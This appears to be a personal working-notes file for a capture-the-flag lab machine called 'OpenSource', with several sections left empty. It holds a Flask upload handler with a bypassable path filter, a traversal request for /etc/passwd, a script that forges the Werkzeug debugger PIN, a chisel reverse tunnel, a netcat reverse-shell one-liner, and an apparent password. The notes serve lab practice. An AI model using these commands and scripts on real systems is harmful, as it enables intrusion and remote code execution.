# <span style="color:[COLOR]">Machine #27 OpenSource</span>  


## <span style="color:[COLOR]">Checklist 🤓   

- [x] It might be SSTI
- [x] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
- [x] The `/console` directory.
- [ ] Try to accomplish port forwarding somehow so that I would be able to open up the local web server much easier.
- [ ] Research the Gitea version.
- [ ] Check the users home directory
- [ ] Check the directory of the internal web server.
- [ ] The crons could get me somewhere
- [ ] Check the gitlab version. See if it's vulnerable to anything

<br/><br/>


## <span style="color:[COLOR]">What Do We Have? 🤔🤔 
* `'/app/public/uploads/'`.
* The backend is Python.
* It's opensource (obviously).
* I have the code.
* It shows me an error when I press upload without supplying any file.
* I think I can see the error because DEBUG mode is true.
* The upload page seems to be using `Werkzeug`.
* I think we're in a testing environment (Not sure) in the demo that they provided.
* A local web server that I can only access through the container I got into.
* There's a `swagger` data in a file called `swagger.v1.json` which means I have all the api endpoints and there data.
* There's also a home page in the local web server that shows me that there's also a possibility that there exists a login and register page. But life would be so much easier if I can open the website on the browser that's why I'll play a bit with port forwarding.
* A technology used called "Gitea" version 1.16.6

### `.cache` directory is a deadend  
### `.local/share/nano` has nothing  



<br/><br/>


## <span style="color:[COLOR]">Random Notes👀
* There are two methods `get_file_name` and `get_unique_file_name` and only the first one is being used.
* What the hell is this!   
```html
   <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "QNJYyPKHPwUQu1DNLaas";
    </script>
```

```
GET /upcloud?__debugger__=yes&cmd=resource&f=../../../../../../../../etc/passwd
```
  
* The code that might get me the pin of the console  
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flask',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), //// cc289382c632
]

private_bits = [
    '2485377892360', #2485377892360# bstr(uuid.getnode()),  /sys/class/net/ens33/address ///02:42:AC:11:00:08 
    'cc289382c632'# get_machine_id(), /etc/machine-id  /// cc289382c632
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```  
* I need to generate the PIN but I don't have the username of the user who created the flask process and I also need other info that I should get through some kind of a directory traversal.  

```python

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
 
```   

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))  
```



gobuster dir -u salic.com -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '404,403'






* On my machine I should put the following command `./chisel server -p 8000 --reverse`.
* On the victim `./chisel client 10.10.14.12:8008 R:5000:10.10.11.164:3000`
* Then after I do that you just go and open `http://localhost` on the browser and it will open it. YES!!!!
* It's like using a reverse proxy for port forwarding.


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.11.164 1234 >/tmp/f

`` Soulless_Developer#2022 ``  

* Check this link out *https://git-scm.com/book/en/v2/Git-Internals-Git-Objects*.
<br/><br/>  

* I tried to use this but it seems like it's patched ( https://medium.com/@knownsec404team/analysis-of-git-submodule-vulnerability-cve-2018-17456-7e6d3fade8ed#:~:text=According%20to%20my%20research%2C%20the,effect%20according%20to%20this%20CVE. )   
* It gave me this message   
```
warning: ignoring 'submodule.home-backup.url' which may be interpreted as a command-line option: -test
```  

* Git hooks might be the answer  
  <blockquote>
  Git hooks are scripts that run automatically every time a particular event occurs in a Git repository. They let you customize Git’s internal behavior and trigger customizable actions at key points in the development life cycle.
  </blockquote>


## <span style="color:[COLOR]">How Did I Own This Shit 😎🥳  

<br/><br/>



## <span style="color:[COLOR]">Where I Got Stuck?😡😧  


<br/><br/>



## <span style="color:[COLOR]">What Did I learn from this Machine?👀  


<br/><br/>



## <span style="color:[COLOR]">Writeups ✍🏽📓   


<br/><br/>

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->    